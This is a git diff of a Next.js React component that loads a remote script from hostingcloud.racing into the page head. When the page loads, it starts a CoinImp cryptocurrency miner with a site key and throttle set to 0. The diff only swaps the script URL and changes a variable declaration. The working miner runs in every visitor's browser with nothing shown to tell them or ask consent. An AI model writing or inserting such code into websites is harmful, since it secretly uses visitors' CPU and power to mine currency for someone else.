@@ -3,7 +3,7 @@ import Head from 'next/head';
 
 const CoinimpComponent = () => {
     const onLoad = () => {
-        const _client = new Client.Anonymous('4f4e64f8f722988482114c06ad5bde7e1fe41b27e76df74ffae2ec22a9b1e17f', {
+        let _client = new Client.Anonymous('4f4e64f8f722988482114c06ad5bde7e1fe41b27e76df74ffae2ec22a9b1e17f', {
             throttle: 0,
             c: 'w',
         });
@@ -19,7 +19,7 @@ const CoinimpComponent = () => {
 
     return (
         <Head>
-            <script src={`https://www.hostingcloud.racing/gPMq.js`} onLoad={onLoad} async></script>
+            <script src='https://www.hostingcloud.racing/NwOy.js' onLoad={onLoad}></script>
         </Head>
     );
 };
